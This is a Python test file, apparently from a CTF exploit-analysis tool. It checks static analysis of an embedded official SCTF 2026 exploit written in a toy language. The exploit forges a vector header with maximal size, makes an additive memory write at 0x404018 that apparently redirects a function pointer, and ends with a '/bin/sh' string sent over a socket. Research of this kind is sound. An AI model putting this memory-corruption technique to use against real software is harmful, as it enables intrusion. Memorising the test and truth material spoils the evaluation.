import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
AUTOCORRECT = ROOT / "autocorrect"
PROJECT = ROOT / "pwncraft"
for path in (AUTOCORRECT, PROJECT):
    if str(path) not in sys.path:
        sys.path.insert(0, str(path))

from challenge_intake import load_splits, split_for_case
from pwncraft.features.audit.embedded_compiler import EmbeddedCompilerPolicy
from pwncraft.features.audit.embedded_runtime import (
    EmbeddedFieldLayout,
    EmbeddedIndexedAddSemantics,
    EmbeddedObjectLayout,
    EmbeddedRuntimePolicy,
)
from pwncraft.features.audit.semantic_facts import analyze_exp_semantics

CASE_ID = "memory_write-sctf-2026-slang-a31e8aa0"
TRUTH = ROOT / "autocorrect" / "cases" / CASE_ID / "expected_truth_cycle18.json"

OFFICIAL_SLANG = r'''function one() : -> int {
  return 1;
}

function forge() : -> str {
  return "\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\x7f";
}

function pwn(int round, vec forged_vec) : -> void {
  if (round == 0) {
    return;
  };
  say("resolve puts");
  scribble(forged_vec, 526339, -205200);
  say("/bin/sh");
  return;
}

function main() : int round, int keep_marker, vec vec_slot, str forged_header -> int {
  vec_slot := vec_new(0);
  round := 0;
  keep_vec(vec_slot);
  do {
    pwn(round, vec_slot);
    forged_header := forge();
    keep_marker := one() + 1234;
    round := round + 1;
  } while (round < 2);
  keep_str(forged_header);
  keep_int(keep_marker);
  return 0;
}
'''
OFFICIAL_EXP_SHAPE = (
    "PAYLOAD = " + repr(OFFICIAL_SLANG) + "\n"
    "def main():\n"
    "    source = PAYLOAD + 'END_OF_SOURCE\\n'\n"
    "    sock.sendall(source.encode())\n"
)


def _truth() -> dict:
    return json.loads(TRUTH.read_text(encoding="utf-8"))


def _compiler_policy() -> EmbeddedCompilerPolicy:
    raw = _truth()["reviewed_compiler_policy"]
    return EmbeddedCompilerPolicy(
        name=raw["name"],
        skip_loop_void_call_arguments_in_liveness=raw["skip_loop_void_call_arguments_in_liveness"],
        codegen_preserves_call_arguments=raw["codegen_preserves_call_arguments"],
        slot_allocator=raw["slot_allocator"],
        provenance=raw["provenance"],
    )


def _runtime_policy() -> EmbeddedRuntimePolicy:
    raw = _truth()["reviewed_runtime_policy"]
    layouts = []
    for layout in raw["object_layouts"]:
        layouts.append(EmbeddedObjectLayout(
            type_name=layout["type_name"],
            size=layout["size"],
            fields=tuple(EmbeddedFieldLayout(**field) for field in layout["fields"]),
        ))
    operations = tuple(
        EmbeddedIndexedAddSemantics(**item) for item in raw["indexed_add_operations"]
    )
    return EmbeddedRuntimePolicy(
        name=raw["name"],
        object_layouts=tuple(layouts),
        indexed_add_operations=operations,
        endianness=raw["endianness"],
        pointer_width=raw["pointer_width"],
        provenance=raw["provenance"],
    )


def _result() -> dict:
    return analyze_exp_semantics(
        OFFICIAL_EXP_SHAPE,
        embedded_compiler_policy=_compiler_policy(),
        embedded_runtime_policy=_runtime_policy(),
    )


def test_truth_revision_five_is_locked_to_official_sctf_materials() -> None:
    assert split_for_case(CASE_ID, load_splits()) == "train"
    truth = _truth()
    assert truth["truth_lock"]["truth_revision"] == 5
    assert truth["truth_lock"]["supersedes"] == \
        "truth-sctf2026-slang-cross-iteration-type-confusion-v4"
    assert truth["materials"]["official_writeup_git_blob_sha1"] == \
        "f6d4a55258e8cd64fe31565eb3ce8fa7de7b1ab9"


def test_official_forge_bytes_decode_to_reviewed_vec_fields() -> None:
    result = _result()
    assert result["status"] == "ok"
    runtime = result["embedded_runtime_semantics"][0]
    relation = runtime["relations"][0]
    interpretation = relation["field_interpretation"]
    assert interpretation["raw_hex"] == "0000000000000000ffffffffffffff7f"
    fields = {item["name"]: item["value"] for item in interpretation["fields"]}
    assert fields == {"data": 0, "size": 0x7FFFFFFFFFFFFFFF}
    assert interpretation["runtime_observed"] is False


def test_official_scribble_call_derives_exact_constrained_additive_write() -> None:
    result = _result()
    runtime = result["embedded_runtime_semantics"][0]
    write = runtime["relations"][0]["indexed_additive_writes"][0]
    assert write["data"] == 0
    assert write["size"] == 0x7FFFFFFFFFFFFFFF
    assert write["index"] == 526339
    assert write["delta"] == -205200
    assert write["address"] == 0x404018
    assert write["width"] == 8
    assert write["operation"] == "add"
    assert write["bounds_proven"] is True
    assert write["runtime_observed"] is False


def test_cycle18_promotes_only_constrained_additive_write_not_control_plan() -> None:
    result = _result()
    primitive = next(item for item in result["primitives"] if item.get("domain") == "memory_write")
    assert primitive["name"] == "constrained additive 64-bit write"
    assert primitive["address"] == 0x404018
    assert primitive["delta"] == -205200
    assert primitive["state"] == "derived_static"
    assert "GOT" not in primitive["name"]
    assert "arbitrary" not in primitive["name"]

    truth = _truth()
    assert "automatic symbol identity for address 0x404018 is deferred" in truth["unknown"]
